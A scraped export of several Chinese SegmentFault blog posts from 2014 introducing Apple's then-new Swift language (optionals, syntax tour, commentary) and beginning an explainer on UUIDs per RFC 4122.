<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVco3y"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p><strong>2.对变量进行操作时</strong></p>

<pre><code>var arrayCount = dataList?.count
</code></pre>

<p>这时问号的意思类似于isResponseToSelector，即如果变量是nil，则不能响应后面的方法，所以会直接返回nil。如果变量非nil，就会拆Some(T)的包，取出原始值执行后面的操作。</p>

<pre><code>var arrayCount = dataList!.count
</code></pre>

<p>这里的叹号和之前的问号则不同，这里表示我确定dataList一定是非nil的，所以直接拆包取出原始值进行处理。因此此处如果不小心让dataList为nil，程序就会crash掉。</p>

<p><strong><em>回到上面声明时？和！区别的问题上去</em></strong><br>
    声明变量时的？只是单纯的告诉Swift这是Optional的，如果没有初始化就默认为nil，而通过！声明，则之后对该变量操作的时候都会隐式的在操作前添加一个！。</p>

<p><strong>总结</strong></p>

<ol>
<li>问号？<br>
a.声明时添加？，告诉编译器这个是Optional的，如果声明时没有手动初始化，就自动初始化为nil<br>
b.在对变量值操作前添加？，判断如果变量时nil，则不响应后面的方法。</li>
<li>叹号！<br>
a.声明时添加！，告诉编译器这个是Optional的，并且之后对该变量操作的时候，都隐式的在操作前添加！<br>
b.在对变量操作前添加！，表示默认为非nil，直接解包进行处理</li>
</ol>

                ", Swift中的！和？,1531972175,320,1,458,1,1,https://segmentfault.com/a/1190000000533936
187,1,0,6,"
                    
<p>Apple的WWDC在昨天圆满结束，期望iPhone6的同学可能很失望，但是对于程序员们，他们又多了好多新玩具。除了成堆的新API，Apple还发布了一款全新的编程语言——<a rel=""nofollow"" href=""https://developer.apple.com/library/prerelease/ios/referencelibrary/GettingStarted/LandingPage/index.html"">Swift</a>。</p>

<p>早就有谣言Apple会想办法替换掉ObjectiveC，但大家都没当回事。可这次，Apple直接放了大招。</p>

<p>并不是Apple喜欢折腾，是ObjectiveC的确不招人喜欢：</p>

<ol>
<li>作为一个C语言的变种，它有较为陡峭的学习曲线</li>
<li>缺乏动态特性。虽然新版的ObjectiveC已经非常努力的更新很多看起来很NB的东西，但是这在其他语言确实天生支持的。<br><br><ol>
<li>Java直到8才支持lamda，但ObjectiveC的2013年就支持Block了。不过Block的限制太多，而且语法丑陋</li>
<li>
<em>id</em>和<em>instancetype</em>这些东西的产生都是很无奈的，没法彻底解放复杂的类型申明</li>
<li>说好的generic和auto-boxing呢</li>
<li>...</li>
</ol>
</li>
<li>[[ObjectievC 的语法] 太罗嗦]</li>
<li>...（欢迎补充）</li>
</ol>
<p>Swift发布后，我第一时间下载了<a rel=""nofollow"" href=""https://itunes.apple.com/cn/book/swift-programming-language/id881256329?l=en&amp;mt=11"">免费的教程</a>，看完了Language Guide后写下我第一篇关于Swift的文章。</p>

<p>可以预料，网上已经有很多文章在说Swift又如何如何的好了。它到底好不好，我们这打个问号。先让说说它十分有特色的地方，顺便附上免费吐槽。</p>

<h2>Swift的产生</h2>

<blockquote>
  <p>Swift is a new programming language for iOS and OS X apps that builds on the best of C and Objective-C, without the constraints of C compatibility.</p>
</blockquote>

<p>我们解读下Swift编程指南中开篇的第一句话：</p>

<ol>
<li>它是为了编写iOS和OSX的应用而产生的</li>
<li>它吸取了C和ObjectiveC的优点</li>
<li>它去掉了为了实现对C兼容性而做出的妥协</li>
</ol>
<p>Swift的产生是面向未来的，并且是冷静分析了当前Apple软件生态圈之后归纳总结出新语言。编程指南的开篇也提到，Apple内部已经使用了Swift多年。</p>

<p>事实上，有LLVM在前，大家应该不难想像Apple可以搞出很多种高级语言出来，反正只要能通过LLVM编译，就能接入Apple的生态体系了。看看隔壁的微软吧，一个.net上面有多少种语言？</p>

<p>Swift也不是Apple的第一次折腾。从Carbon到Cocoa，从MRC到ARC，大家都是含着泪走过来的。其实，Swift也并不能宣判ObjectiveC的死刑，我相信，对于这种翻天覆地的改动，就算一切顺利，也需要一年左右的时间让开发者接受。Apple很可能会观察社区动向，同时对两种语言进行调整，最坏的情况下，有一部分市场的应用仍旧使用ObjectiveC，而另外一部分，尤其是游戏，很可能彻底抛弃ObjectiveC，而使用更敏捷的Swift。</p>

<p>Swift的定位，意味着它有丰富的动态特性，同时拥有静态语言的性能和安全性。你可以通过XCode6的Playground项目进行实验，也可以直接通过Swift编译器进行调试。Swift Compiler位于：</p>

<pre><code>/Applications/Xcode6-Beta.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/swift
</code></pre>

<h2>变量和数据类型</h2>

<h3>
<em>let</em> it be</h3>

<p>Swift的所有变量都需要用<em>let</em>或者<em>var</em>声明。这两个关键字的在别的语言广泛存在：ECMAScript（JavaScript、ActionScript）、Go。Swift也并不要求开发者一定需要写明其数据类型，因为编译器有一定能力推断变量的数据类型。</p>

<pre><code>let implicitInteger = 70
let implicitDouble = 70.0
let explicitDouble: Double = 70
</code></pre>

<p>注意，这并不是说Swift变成弱类型了。事实上，Swift的变量一旦确定了类型，便不能改变。而且，Swift也不存在隐式转换。例如，如果需要字符串拼接，需要你手动转换：</p>

<pre><code>let widthLabel = label + String(width)
</code></pre>

<h3>Generics</h3>

<pre><code>let emptyDictionary = Dictionary&lt;String, Float&gt;()
</code></pre>

<p>ObjectiveC的数据结构最大的诟病就是不支持Generic了。Swift还提供了两个万精油的数据类型：</p>

<ol>
<li>AnyObject</li>
<li>Any</li>
</ol>
<p>相当于于<code>void*</code>和<code>id</code>了，这些东西联合起来可以说是让大家对数据结构的应用更灵活一些了。</p>

<h3>数据类型</h3>

<p>除了常见的Int、UInt、Float、Double、Bool之外，它还有目前动态语言喜欢使用的Tuple。</p>

<pre><code>var my2dPosition = (20, 20)
var my3dPosition = (20, 10, 50)
</code></pre>

<p>这也意味着，支持返回多个数值和Deconstructing了。</p>

<pre><code>var (a,b) = (10,20)
</code></pre>

<p>然后就是<code>Range</code>,一种全闭合，一种半开半闭。</p>

<ul>
<li>1...3</li>
<li>1..3</li>
</ul>
<h2>函数</h2>

<p>好吧，Swift函数也很难看。它看起来像是Go、Ruby的结合体。但从特性上来讲，Swift的函数是非常优秀的。</p>

<ul>
<li>Functions are a first-class type</li>
<li>可变的函数列表</li>
<li>Closure<br><br><ul>
<li>尾部Closure调用</li>
<li>捕获当前作用域</li>
</ul>
</li>
<li>Local and external argument names</li>
</ul>
<p>这部分将开来讲太复杂了。可以说该有的动态语言特性都有了。</p>

<h2>流程控制</h2>

<p>更严格的if语句在判断条件时，并不考虑0，而只考虑Boolean。</p>

<p>功能无比强大的switch再也不是鸡肋了：</p>

<pre><code>let somePoint = (1, 1)
switch somePoint {
case (0, 0):
    println(""(0, 0) is at the origin"")
case (_, 0):
    println(""(\(somePoint.0), 0) is on the x-axis"")
case (0, _):
    println(""(0, \(somePoint.1)) is on the y-axis"")
case (-2...2, -2...2):
    println(""(\(somePoint.0), \(somePoint.1)) is inside the box"")
default:
    println(""(\(somePoint.0), \(somePoint.1)) is outside of the box"")
}
// prints ""(1, 1) is inside the box
</code></pre>

<h2>enum、class、struct</h2>

<p>把<code>enum</code>放在这里，是因为Swift里面的<code>enum</code>的确都是一个类了。</p>

<pre><code>enum Rank: Int {
    case Ace = 1
    case Two, Three, Four, Five, Six, Seven, Eight, Nine, Ten
    case Jack, Queen, King
    func simpleDescription() -&gt; String {
        switch self {
        case .Ace:
            return ""ace""
        case .Jack:
            return ""jack""
        case .Queen:
            return ""queen""
        case .King:
            return ""king""
        default:
            return String(self.toRaw())
        }
    }
}
</code></pre>

<p>面对如此凶残的<code>enum</code>我们怎么把持的住？</p>

<p>Swift的类继承可能时Swift里最接近C、C++的地方了。无论是它的默认构造函数、解构函数，还是它后面提到的操作符重载都是C的那套思想，只是表现形式换了下。这意味着，这些东西很麻烦。</p>

<p>而同时又有动态语言常有的<code>getter</code>和<code>setter</code>那套。</p>

<pre><code>struct Rect {
    var origin = Point()
    var size = Size()
    var center: Point {
    get {
        let centerX = origin.x + (size.width / 2)
        let centerY = origin.y + (size.height / 2)
        return Point(x: centerX, y: centerY)
    }
    set(newCenter) {
        origin.x = newCenter.x - (size.width / 2)
        origin.y = newCenter.y - (size.height / 2)
    }
  }
}
</code></pre>

<p>每个Property还有两个特殊的observer:</p>

<pre><code>class StepCounter {
    var totalSteps: Int = 0 {
    willSet(newTotalSteps) {
        println(""About to set totalSteps to \(newTotalSteps)"")
    }
    didSet {
        if totalSteps &gt; oldValue  {
            println(""Added \(totalSteps - oldValue) steps"")
        }
    }
    }
}

</code></pre>

<p>其他的如<code>Protocol</code>、<code>Extension</code>什么的依旧是有的，并且，两者都可以当做Type作为声明变量。</p>

<h2>Optional Type</h2>

<p>还不知道这个东西该怎么翻译成中文，直接上代码吧：</p>

<pre><code>if let johnsStreet = john.residence?.address?.street {
    println(""John's street name is \(johnsStreet)."")
} else {
    println(""Unable to retrieve the address."")
}
// prints ""Unable to retrieve the address.""
</code></pre>

<p>一个值要么存在，要么为nil。和if一起使用被成为<code>Optional Binding</code>。</p>

<p>这恐怕是Swift里最晦涩的概念了。由于Swift里没有指针，而ObjectiveC里一个默认行为就是向<code>nil</code>对象的调用（发送消息）是没有任何效果，这个特点要完整迁移到Swift里是很困难的。Optional Type的确提供了这个可能， 但这也恐怕是Swift学习成本最大的地方了。</p>

<h2>与Cocoa和CocoaTouch的混用</h2>

<p>Swift可以和Cocoa、CocoaTouch进行文件级别的混用，也就是说你的项目里可以同时存在这两种文件。在Swift里使用Cocoa的API也是可以的：</p>

<pre><code>let dataViewController = storyboard.instantiateViewControllerWithIdentifier(""DataViewController"") as DataViewController
</code></pre>

<p>Apple通过了复杂的桥接实现了这些，但可以远见之后会有很第三方多框架兼容性问题了。</p>

<p>Swift已经不支持C和C++代码的混用了，要记住这是Swift产生的初衷之一。</p>

<h2>期望和展望</h2>

<p>个人预测它的流行程度很快会超过Go、Ruby，并与Python并排，之后会稳定上升，最终是否会超过ObjectiveC，甚至接近Java，都需要看Apple的布局了。</p>

<p>XCode6内目前是支持以两种不同的语言来编写应用的，但不知道未来是否会慢慢淘汰ObjectiveC。Apple完全有能力维护两套语言，问题在于它是否需要。在很多领域，开发者早就渴望一种充满动态语言特性的开发语言了，想想iOS上那些内嵌Lua的应用吧。</p>

<p>但是，我觉得Swift并不该像它的前辈那样停留在编写几个iOS或者Mac应用上面，它应该走出来，成为真正意义上的通用语言。</p>

                ", 杂谈Apple Swift,1531972176,362,1,991,1,1,https://segmentfault.com/a/1190000000532286
188,1,0,6,"
                    
<p>Apple在WWDC 2014开发者大会上发布了用于Mac OS X和iOS编程的新一代编程语言Swift。</p>

<p>在真正能够使用Swift之前，SF先带大家从Apple的Beta版文档中，简单的一览Swift的基础用法。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVcoqq"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p><code>SEGMENTFAULT声明：本文是根据**未发布版本**的文档编译整理而成的。</code><br><code>我们无法保证苹果公司未来实际发布的软件，与本文的情况完全一致。</code></p>

<p><code>注：不要错过文章末尾的《SF简评Swift》部分！</code></p>

<h2>101：最基本语法</h2>

<ul>
<li>编译型（LLVM）</li>
<li>等同众多解释型语言的实时输入、实时执行（Playground）</li>
<li>全局域自动执行(无需主函数)</li>
<li>行尾无分号</li>
<li>Hello world：<code>println(""Hello world"")</code>
</li>
<li>注释使用<code>//</code>和<code>/* */</code>。但块注释可以<strong>嵌套</strong>。<br>
例如：<code>/* A /* B */ C */</code>就是合法的。</li>
<li>
<code>=</code>运算符仅用于赋值<br>
与C不同：<code>var = value</code>不是一个合法的表达式<br>
与C一致的是<code>==</code>运算符仍然是判断</li>
</ul>
<h2>变量与数据类型</h2>

<ul>
<li>弱类型</li>
<li>变量：<code>var length = 10</code>
</li>
<li>常量：<code>let MAX_LENGTH = 100</code>
</li>
<li>强制类型：<code>var length: Double = 10</code> (var or let)</li>
<li>完全禁止隐式转换，例如这个是错误的：<br><code>println(""Length = "" + length + "" cm"")</code><br>
必须这样写：<br><code>println(""Length = "" + String(length) + "" cm"")</code><br>
但是在字符串中嵌入数字有一种简写法：<br><code>println(""Length = \(length) cm"")</code>
</li>
</ul>
<h3>空值</h3>

<ul>
<li>空值表示为<code>nil</code>
</li>
<li>必须使用<code>?</code>，显式指定变量可以赋空值：<code>var optionalString: String? = nil</code> （定义或运行时均可）</li>
<li>
<code>nil</code>在逻辑判断中被隐式转换为<strong>false</strong> （这与通常的变量值不得隐式转换不同）</li>
</ul>
<p>另外，如果待引用的变量值可能是<code>nil</code>，一般需要先行判断。但在Swift中，可以在下标、方法或对象成员的引用之前加<code>?</code>。<br>
这个语法表示如果<code>?</code>前边的是<code>nil</code>，则后边的调用全部省略，整个表达式的值是<code>nil</code>。</p>

<p>WWDC 2014会上，Craig Federighi 直接展示了这个用法，将数行带有预判断的代码缩成了一行：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVcor3"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""包含数个if变量不等于nil的多行语句""></span><br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVcorM"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""&lt;code&gt;myDelegate?.scrollViewDidScroll?(myScrollView)&lt;/code&gt;""></span></p>

<h3>数组与字典</h3>

<ul>
<li>全部使用方括号包裹</li>
<li>数组：<code>[value 1, value 2, value 3]</code>
</li>
<li>数组下标从<strong>0</strong>开始</li>
<li>字典：<code>[""key1"": value 1, ""key2"": value 2]</code>
</li>
<li>空数组：<code>[]</code>，空字典：<code>[:]</code>
</li>
</ul>
<h2>流程控制</h2>

<p>注意：Swift中任何条件判断，必须使用真正的布尔值表达式！数值不会按照“0/非0”的习惯规则隐式转换为true，而是<strong>一律报错</strong>。</p>

<h3>条件分支</h3>

<h4>if 判断</h4>

<pre><code>if condition 1 {
    code for condition 1
} else if condition 2 {
    code for condition 2
} else {
    code for none of above
}
</code></pre>

<ul>
<li>
<code>if</code>语句中，小括号<strong>可选</strong>，大括号<strong>必须</strong>。</li>
</ul>
<h4>switch 多出口分支</h4>

<pre><code>switch variable {
    case value 1:
        code for value 1
    case value 2:
        code for value 1
    default:
        code for none of abolve
}
</code></pre>

<ul>
<li>无需<code>break</code>
</li>
<li>可以一次比较多个值：<code>case value 1, value 2:</code> （值1或值2）</li>
<li>比较条件不限于值，可以使用自定义的语句：<code>case let x where x &gt; 10:</code>
</li>
<li>
<code>default</code>分支不得省略。</li>
</ul>
<h3>循环</h3>

<h4>for-in 遍历循环</h4>

<pre><code>for var_iterator in iterated_array {
    code within loop
}
</code></pre>

<ul>
<li>循环字典：<code>for (key, value) in iterated_dictionary</code>
</li>
<li>使用<code>..</code>指定整数的范围：<code>for index in 1..5</code>
</li>
</ul>
<h3>for-condition-increment C风格循环</h3>

<pre><code>for var index = 0; index &lt; 3; ++index {
    code within loop
}
</code></pre>

<h4>while 循环</h4>

<pre><code>while condition {
    code
}

do {
    code
} while condition
</code></pre>

<h2>函数</h2>

<h3>定义与调用</h3>

<pre><code>func greet(name: String, day: String) -&gt; String {
    return ""Hello \(name), today is \(day).""
}
greet(""Bob"", ""Tuesday"")
</code></pre>

<ul>
<li>一次传入多个值：定义<code>func f1(p1: Int...) -&gt; Int {code}</code> 调用<code>f1(1, 2, 3)</code>
</li>
<li>一次返回多个值：<code>return (3.59, 3.69, 3.79)</code> （借助tuple）</li>
</ul>
<p>函数允许嵌套。子函数共享父函数的变量作用域：</p>

<pre><code>func returnFifteen() -&gt; Int {
    var y = 10
    func add() {
        y += 5
    }
    add()
    return y
}
returnFifteen()
</code></pre>

<h3>闭包特性</h3>

<p>函数本身是一种<strong>数据类型</strong>。函数可以作为返回值：</p>

<pre><code>func makeIncrementer() -&gt; (Int -&gt; Int) {
    func addOne(number: Int) -&gt; Int {
        return 1 + number
    }
    return addOne
}
var increment = makeIncrementer()
increment(7)
</code></pre>

<p>也可以把函数本身，作为参数传递给其他函数：</p>

<pre><code>func hasAnyMatches(list: Int[], condition: Int -&gt; Bool) -&gt; Bool {
    for item in list {
        if condition(item) {
            return true
        }
    }
    return false
}
func lessThanTen(number: Int) -&gt; Bool {
    return number &lt; 10
}
var numbers = [20, 19, 7, 12]
hasAnyMatches(numbers, lessThanTen)
</code></pre>

<p>但必须注意类型必须严格等同。</p>

<p>可以使用<code>{}</code>定义匿名函数。可以在花括号内的第一行，使用<code>in</code>关键字定义参数和返回值：</p>

<pre><code>numbers.map({
    (number: Int) -&gt; Int in
    let result = 3 * number
    return result
})
</code></pre>

<ul>
<li>但也可以在类型已知的情况下省略之。例如：<code>numbers.map({ number in 3 * number })</code><br>
这个单行的闭包，只接受一个参数并返回表达式的值。</li>
<li>也可以使用数字引用参数。例如：<code>sort([1, 5, 3, 12, 2]) { $0 &gt; $1 }</code><br>
这个传参方式类似Shell。</li>
</ul>
<h2>对象与类</h2>

<h3>定义与实例化</h3>

<p>定义：</p>

<pre><code>class Shape {
    var numberOfSides = 0
    var name: String
    init(name: String) {
        self.name = name
    }
    func simpleDescription() -&gt; String {
        return ""A shape with \(numberOfSides) sides.""
    }
}
</code></pre>

<p>实例化：</p>

<pre><code>var shape = Shape(""Triangle"")
shape.numberOfSides = 3
println(shape.simpleDescription())
</code></pre>

<ul>
<li>构造：<code>init(name: String) {self.name = name}</code>
</li>
<li>析构：<code>deinit() {code}</code>
</li>
</ul>
<h3>继承与多态</h3>

<ul>
<li>继承在类名后边加<code>:</code>
</li>
<li>使用<code>super</code>关键字引用父类</li>
<li>多态必须显式使用<code>override</code>关键字</li>
</ul>
<pre><code>class Square: NamedShape {
    var sideLength: Double
    init(sideLength: Double, name: String) {
        self.sideLength = sideLength
        super.init(name: name)
        numberOfSides = 4
    }
    func area() -&gt; Double {
        return sideLength * sideLength
    }
    override func simpleDescription() -&gt; String {
        return ""A square with sides of length \(sideLength).""
    }
}
let test = Square(sideLength: 5.2, name: ""my test square"")
test.area()
test.simpleDescription()
</code></pre>

<h3>属性（property）</h3>

<p>能够自定义赋值或取值的代码的变量被称为<strong>属性</strong>（property）。</p>

<ul>
<li>使用<code>get</code>自定义取值，使用<code>set</code>自定义赋值</li>
<li>
<code>get</code>代码段中使用<code>return</code>返回取值结果</li>
<li>
<code>set</code>代码段中固定使用<code>newValue</code>来表示传入的值</li>
<li>也可以使用<code>willSet</code>和<code>didSet</code>，在赋值前后执行代码（不影响赋值本身）</li>
</ul>
<pre><code>class Circle {
    init(radius: Double) {
        self.radius = radius
    }
    var radius: Double {
        didSet {
            perimeter = radius * 6.28
        }
    }
    var perimeter: Double {
        get {
            return 6.28 * radius
        }
        set {
            radius = newValue / 6.28
        }
    }
}
circle = Circle(10)
circle.perimeter // 62.8
circle.perimeter = 31.4
circle.radius // 5
</code></pre>

<h2>枚举与结构体</h2>

<p>使用<code>enum</code>创建枚举量。枚举量有轻度的对象特性——可以在枚举量中使用方法。</p>

<pre><code>enum Rank: Int {
    case Ace = 1
    case Two, Three, Four, Five, Six, Seven, Eight, Nine, Ten
    case Jack, Queen, King
    func simpleDescription() -&gt; String {
        switch self {
            case .Ace:
                return ""ace""
            case .Jack:
                return ""jack""
            case .Queen:
                return ""queen""
            case .King:
                return ""king""
            default:
                return String(self.toRaw())
        }
    }
}
let ace = Rank.Ace
let aceRawValue = ace.toRaw() // 1
</code></pre>

<p>使用<code>toRaw</code>和<code>fromRaw</code>转换原始值和字面值：</p>

<pre><code>if let convertedRank = Rank.fromRaw(11) {
    let jackDescription = convertedRank.simpleDescription() // ""Jack""
}
let jackIndex = Rank.toRaw(Rank.Jack) // 11
</code></pre>

<p>上边的例子中，由于扑克牌存在数字意义的原始值，所以从Ace开始提供了一个1，而后按顺序自动增加。但Swift的枚举类型，为了没有数字意义的枚举量，也支持不使用原始值的定义方法：<code>enum Color {case Red, Green, Blue}</code></p>

<p>也可以在枚举量上开辟变量空间，用来存储一些必要的值：</p>

<pre><code>enum ServerResponse {
    case Result(String, String)
    case Error(String)
}

let success = ServerResponse.Result(""6:00 am"", ""8:09 pm"")
let failure = ServerResponse.Error(""Out of cheese."")

switch success {
    case let .Result(sunrise, sunset):
        let serverResponse = ""Sunrise is at \(sunrise) and sunset is at \(sunset).""
    case let .Error(error):
        let serverResponse = ""Failure... \(error)""
}
</code></pre>

<h3>结构体</h3>

<p>结构体使用<code>struct</code>定义，其定义语法和类非常相似。结构体支持构造器、成员方法等类的特性。</p>

<p>注意：结构体是<strong>按值传递</strong>的，而类/对象是<strong>按引用传递</strong>的。</p>

<pre><code>struct Card {
    var rank: Rank
    var suit: Suit
    func simpleDescription() -&gt; String {
        return ""The \(rank.simpleDescription()) of \(suit.simpleDescription())""
    }
}
let threeOfSpades = Card(rank: .Three, suit: .Spades)
let threeOfSpadesDescription = threeOfSpades.simpleDescription()
</code></pre>

<h2>协议和扩展</h2>

<p>使用<code>protocol</code>定义协议：</p>

<pre><code>protocol ExampleProtocol {
    var simpleDescription: String { get }
    mutating func adjust()
}
</code></pre>

<p>协议可以用在类、枚举和结构体上。</p>

<pre><code>class SimpleClass: ExampleProtocol {
    var simpleDescription: String = ""A very simple class.""
    var anotherProperty: Int = 69105
    func adjust() {
        simpleDescription += "" Now 100% adjusted.""
    }
}
var a = SimpleClass()
a.adjust()
let aDescription = a.simpleDescription

struct SimpleStructure: ExampleProtocol {
    var simpleDescription: String = ""A simple structure""
    mutating func adjust() {
        simpleDescription += "" (adjusted)""
    }
}
var b = SimpleStructure()
b.adjust()
let bDescription = b.simpleDescription
</code></pre>

<p>用<code>extension</code>定义扩展，用来为已有的类型增加新的功能：</p>

<pre><code>extension Int: ExampleProtocol {
    var simpleDescription: String {
        return ""The number \(self)""
    }
    mutating func adjust() {
        self += 42
    }
}
7.simpleDescription
</code></pre>

<h2>泛型</h2>

<p>使用<code>&lt;&gt;</code>声明泛型：</p>

<pre><code>func repeat&lt;ItemType&gt;(item: ItemType, times: Int) -&gt; ItemType[] {
    var result = ItemType[]()
    for i in 0..times {
        result += item
    }
    return result
}
repeat(""knock"", 4)
</code></pre>

<p>泛型可以用在类、枚举和结构体上。</p>

<pre><code>// Reimplement the Swift standard library's optional type
enum OptionalValue&lt;T&gt; {
    case None
    case Some(T)
}
var possibleInteger: OptionalValue&lt;Int&gt; = .None
possibleInteger = .Some(100)
</code></pre>

<p>使用<code>where</code>对泛型提出一些约束：</p>

<pre><code>func anyCommonElements &lt;T, U where T: Sequence, U: Sequence, T.GeneratorType.Element: Equatable, T.GeneratorType.Element == U.GeneratorType.Element&gt; (lhs: T, rhs: U) -&gt; Bool {
    for lhsItem in lhs {
        for rhsItem in rhs {
            if lhsItem == rhsItem {
                return true
            }
        }
    }
    return false
}
anyCommonElements([1, 2, 3], [3])
</code></pre>

<hr>
<h2>SF简评Swift</h2>

<p>Swift无疑是本次WWDC 2014中，贴近苹果开发者的最大亮点。</p>

<p>Swift并不是对语言思想的本质革新，而是从当前的各种优秀语言中博采众家之长，从而制成为苹果平台提供的优秀工具。</p>

<p>Swift尤其是对于各种“坑”的处理非常用心。例如：</p>

<ul>
<li>嵌套注释</li>
<li>封锁隐式类型转换</li>
<li>封锁隐式逻辑判断</li>
<li>……</li>
</ul>
<p>这些对于新手和老手而言，都是好的。“减轻新手痛苦，节约老手时间”——我想起了这一句广告词。</p>

<p>我们相信Swift（至少在部分场合下）作为Objective-C的代用语言，将在苹果开发过程中发挥不可或缺的作用。</p>

<p>我们目前主要对Swift存疑的地方有：</p>

<ol>
<li>浮夸的Benchmark数据。<br>
WWDC大会上Swift宣传相对Python等语言数十至数百倍的性能提升，是一种纯粹的广告口径——因为优秀编程语言之间出现如此巨大的性能差距，这本身就不太现实。我们期待将来能有第三方，对Swift本身给出资料和样例数据充分的公正的Benchmark。</li>
<li>Swift的开源程度。<br>
编程语言作为系统基础工具，其行为的透明性是非常关键的。斯诺登把世界吓怕了——希望自己的代码能够放心使用，而不至于在编程语言这一层面，就存在被植入预期以外的行为，这是现在的某些开发者客观存在的一个合理担忧。</li>
<li>Swift的应用领域。<br>
Swift究竟会成为一门通用的编程语言，还是只是作为苹果SDK的一部分而存在？这一点和Swift的开源程度是有重叠的——开源也许就意味着广为使用，而闭源就等同于Swift专用于苹果平台。</li>
</ol>
<p>我们不愿意做任何的预先判断，只期待Swift公布后实际的表现如何。</p>

<h2>Swift相关阅读推荐</h2>

<h3>语言介绍</h3>

<p>苹果官方文档：（Pre-relase，发布前版本）<br><a rel=""nofollow"" href=""https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/Swift_Programming_Language/GuidedTour.html#//apple_ref/doc/uid/TP40014097-CH2-XID_1"">A Swift Tour, The Swift Programming Language, iOS Developer Library — Pre-Release </a><br>
本文很多内容来自于对该文档的翻译。<br>
来自其他作者的同一译文：<a rel=""nofollow"" href=""http://zh.lucida.me/blog/an-introduction-to-swift/"">来自苹果的编程语言——Swift简介</a></p>

<h3>网络讨论</h3>

<p><a rel=""nofollow"" href=""http://www.zhihu.com/question/24002984/answer/26354882"">如何评价 Swift 语言？</a><br><a rel=""nofollow"" href=""http://www.zhihu.com/question/24004030"">新发布的 Swift 语言对初学者来说是新的机遇吗？</a></p>

<hr>
<p>SegmentFault编译原创文章，转载请遵守本站相关声明。<br>
外文原作者：Apple Inc.<br>
编译与原创部分：沙渺<br>
责任编辑：沙渺</p>

                ", 【WWDC 2014】带您一览苹果全新编程语言Swift,1531972178,104,1,228,1,1,https://segmentfault.com/a/1190000000531511
189,1,0,6,"
                    
<h2>HelloWorld</h2>

<pre><code class=""lang-swift"">println(""Hello, world"")    //木有分号！
</code></pre>

<h2>变量</h2>

<pre><code class=""lang-swift"">var foo = 7
foo = 8
</code></pre>

<h2>常量</h2>

<pre><code class=""lang-swift"">let pi = 3.14
</code></pre>

<h2>map</h2>

<pre><code class=""lang-swift"">var occupations = [
    ""Malcolm"": ""Captain"",
    ""Kaylee"": ""Mechanic"",
]
occupations[""Jayne""] = ""Public Relations""
</code></pre>

<h2>循环判断</h2>

<p>for循环和if else</p>

<pre><code class=""lang-swift"">let individualScores = [75, 43, 103, 87, 12]
var teamScore = 0
for score in individualScores {
    if score &gt; 50 {
        teamScore += 3
    } else {
        teamScore += 1
    }
}
</code></pre>

<p>while</p>

<pre><code class=""lang-swift"">var n = 2
while n &lt; 100 {
    n = n * 2
}
</code></pre>

<h2>函数和闭包</h2>

<p>函数声明和调用</p>

<pre><code class=""lang-swift"">func greet(name: String, day: String) -&gt; String {
    return ""Hello \(name), today is \(day).""
}
greet(""Bob"", ""Tuesday"")
</code></pre>

<p>闭包</p>

<pre><code class=""lang-swift"">numbers.map({
    (number: Int) -&gt; Int in
    let result = 3 * number
    return result
    })
</code></pre>

<h2>class和对象</h2>

<pre><code class=""lang-swift"">class Shape {
    var numberOfSides = 0
    func simpleDescription() -&gt; String {
        return ""A shape with \(numberOfSides) sides.""
    }
}
</code></pre>

<p>从class生成对象</p>

<pre><code class=""lang-swift"">var shape = Shape()
shape.numberOfSides = 7
var shapeDescription = shape.simpleDescription()
</code></pre>

<p>来自: Apple Inc. “The Swift Programming Language”。 iBooks. <a rel=""nofollow"" href=""https://itunes.apple.com/WebObjects/MZStore.woa/wa/viewBook?id=881256329"">https://itunes.apple.com/WebObjects/MZStore.woa/wa/viewBook?id=881256329</a></p>

                ", 浅入浅出Swift,1531972180,445,1,208,1,1,https://segmentfault.com/a/1190000000531486
190,1,0,6,"
                    
<p>日期：2014-04-26(该死, 又凌晨了)<br>
原文参考：<a rel=""nofollow"" href=""http://tools.ietf.org/html/rfc4122.html"">http://tools.ietf.org/html/rfc4122.html</a></p>

<p>前言：高级与普通程序员的区别就是, 普通程序只复(cao)用(xie)代码片段, 而高级一点的无非就只知道点规范, 写点东西, 让其他人Copy</p>

<blockquote>
  <p>本屌最讨厌的面试题是, XXX为什么这么设计, TMD我哪知道啊, 创始人就这么写, 我也没辙啊!</p>
</blockquote>

<h2>简介</h2>

<p>UUID, 又名全球独立标识(Globally Unique Identifier), 当然原名更高大上点儿, A.K.A 宇宙独立标识（Universally Unique Identifier). UUID最初用在一个本屌没听过的网络系统中, 然后被广泛应用到微软抄做系统.</p>

<p>UUID是128位(长度固定)unsigned integer, 能够保证(真的假的？)在空间(Space)与时间(Time)上的唯一性。而且无需注册机制保证, 可以按需随时生成。</p>

<p>据<a rel=""nofollow"" href=""http://en.wikipedia.org/wiki/Universally_unique_identifier#Random_UUID_probability_of_duplicates"">WIKI</a>, 随机算法生成的UUID的重复概率为170亿分之一</p>

<p><em>由于UUID定长且与时间有关, 有一定可能性UUID会重复出现（大概在西元(A.D)3400, 与具体实现算法有关）</em></p>

<p>UUID生成算法最高支持10,000,000(一千万)每秒每台机器, 所以可以用作交易流水ID</p>

<p>uuid(Python)和NSUUID(iOS)遵循本<a rel=""nofollow"" href=""http://en.wikipedia.org/wiki/Request_for_Comments"">RFC</a></p>

<h2>UUID生成三种方式</h2>

<ol>
<li>基于利用MAC地址（若由于某种原因包括隐私考虑, MAC地址不可用或强烈不推荐, 采用以下两种替代方法）</li>
<li>基于伪随机数</li>
<li>基于加密哈希(MD5之类的东东)和应用自定义字符串</li>
</ol>
<h2>字符表示</h2>

<p>[time-low]-[time-mide]-[time-high-and-version]-[clock-seq-and-reserved 和 clock-seq-low]-[node]</p>

<p>time-low = 32位 unsigned integer<br>
time-mid = 16位 unsigned integer<br>
time-high-and-version = 16位 unsigned integer(时间戳高位部分与版本(Version)号混合)<br>
clock-seq-and-reserved = 8位 unsigned integer(时钟序列高位部分与预定义变量(Variant)混合组成)<br>
clock-seq-low = 8位 unsigned integer<br>
node = 48位 unsigned integer</p>

